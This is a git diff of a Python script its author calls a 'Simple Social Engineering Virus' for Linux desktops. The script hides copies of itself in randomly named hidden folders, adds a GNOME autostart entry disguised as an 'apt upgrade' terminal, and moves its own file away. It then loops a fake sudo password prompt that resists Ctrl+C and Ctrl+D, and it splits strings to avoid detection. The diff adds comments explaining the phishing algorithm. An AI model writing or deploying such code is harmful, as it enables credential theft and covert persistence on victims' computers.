@@ -1,5 +1,7 @@
 #!/bin/python3
 
+#Simple Social Engineering Virus
+
 #Importing modules
 import getpass #For Getting password
 import os #To perform os level operations
@@ -54,7 +56,7 @@ def dirgenerator():
     #For Generating random names for creating dirs for storing This script code
     for j in range(20):
         dirname = ""
-        for i in range(9):
+        for i in range(9):#change this number to change the number of characters used in createing the directory name.
             dirname += random.choice(chars)
         dirs.append(dirname)
 
@@ -63,21 +65,27 @@ def dirgenerator():
 #    hideuin = "/home/"+getpass.getuser()+"/."+random.choice(names)
 
     os.system(f"mkdir {hideuin}")
-    for i in range(12):#change this number to create multiple folders inside the choosen folder
+    for i in range(12):#change this number to create multiple folders in which we can store our script.
         crtdir = "mkdir "+hideuin+"/"+dirs[i]
         os.system(crtdir)
         crteddirs.append(dirs[i])
+    # creating a folders to store our sctipt
     newfileloc = hideuin+"/"+random.choice(crteddirs)+"/."+random.choice(names)
     os.system(f"mkdir {newfileloc}")
     newfileloc = newfileloc+"/"+random.choice(crteddirs)
     os.system(f"mkdir {newfileloc}")
-    print(newfileloc)
-    return newfileloc+"updater.py"
+#    print(newfileloc) -> remove the # if you wanna see where the script hides itself 
+    return newfileloc+"/"+"updater.py"
 
 
 
+######## ------- ########
+# Another wat to find   #
+# directory list inside #
+#       Home            #
+######## ------- ########
 
-    # for i in paths:
+   # for i in paths:
     #     if pathlib.Path(i).is_dir()==True:
     #         print("foldrer:",i)
     #         continue
@@ -102,8 +110,6 @@ def dirgenerator():
 # print(pathlib.Path("/home/energy/.xsession-errors.old").is_file())
 
 
-#Simple Social Engineering Virus
-
 #This will get what attack we are gonna specify
 try:
     Attack = sys.argv[1]
@@ -111,12 +117,14 @@ except IndexError:
     Attack = None
 
 
-#if We No parameter is given. Then it will create a file to auto start.
+#if No parameter is given. Then it will infect the system.
 if Attack == None:
-#Just to make the script to dont look suspicious while execution
+    #Just to make the script to dont look suspicious while execution
+    
     message = input("Notification Message: ")
     os.system(f"notify-send {message}")
-
+    
+    #getting location to hide the script
     newfileloc = dirgenerator()
 
     #using touch command so that it wont distrub if the file already exist and also creates if it doesn't exist
@@ -128,15 +136,29 @@ if Attack == None:
     with open("/home/{}/.config/autostart/gnome-terminal.desktop".format(getpass.getuser()), "w") as _:
         _.write(
             f'[Desktop Entry]\nType=Application\nExec=gnome-terminal --tab --title="apt upgrade" -e \"bash -c \'python3 {newfileloc} R;bash\'"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[en_NG]=Terminal\nName=Terminal')
-
-#    subprocess.Popen(f"nhop python3 {newfileloc} R", shell=True)
     
+    #To hide our script, We are moving our sctipt to new location.
     os.system(f"mv '{__file__}' '{newfileloc}'")
 
-
-if Attack != None and Attack == "R":
+#If R is specified as a argument we can start the attack
+if Attack == "R":
 
     while True:
+        
+        # A never ending loop to get password. will not stop untill the victim exits from the terminal or entering password.
+        
+        #Algorithm used here:
+#        1.if any exception occured in the process then continue the loop.#so it wont stop in keyboard interupt (i.e) CTRL+C or EOF Signal (i.e) CTRL+D 
+#         1.getting password for the first time and storing it in pswd
+#         2.sleep 2 second
+#         3.printing error message as they entered a wrong password.(To make sure the password entered is right.)
+#         4.getting password for the second time and storing it in pswd1
+#         5.comparing the phished passwords pswd and pswd1
+#         6.if both passwords are same Then pswd is choosen as the sudo password of vitim and quits ,else 7.
+#         7.getting password for the third time and storing it in pswd2
+#         8.if pswd2 is either equal to pswd or equal to pswd1 then pswd2 is choosen as the sudo password of vitim and quits ,else 9.
+#         9.print the error message and quits
+
 
         try:
             pswd = getpass.getpass(
@@ -152,11 +174,16 @@ if Attack != None and Attack == "R":
             else:
                 time.sleep(2)
                 print("Sorry, try again.")
-                pswd3 = getpass.getpass(
+                pswd2 = getpass.getpass(
                     "[s"+"udo] P"+"asswo"+"rd for"+" {}:".format(getpass.getuser()))
+
+                if pswd == pswd2 or pswd1 == pswd2:
+                    print(f"Your password is {pswd2} ")
+                    os.system(f"notify-send 'You Got Phished' 'Your Password is Phished :P ... LOL ...  {pswd2}'")
+                    break
+
                 time.sleep(2)
                 print("s"+"udo: "+"3 incor"+"rect pas"+"swo"+"rd atte"+"mpts")
-
                 break
         except:
             print()
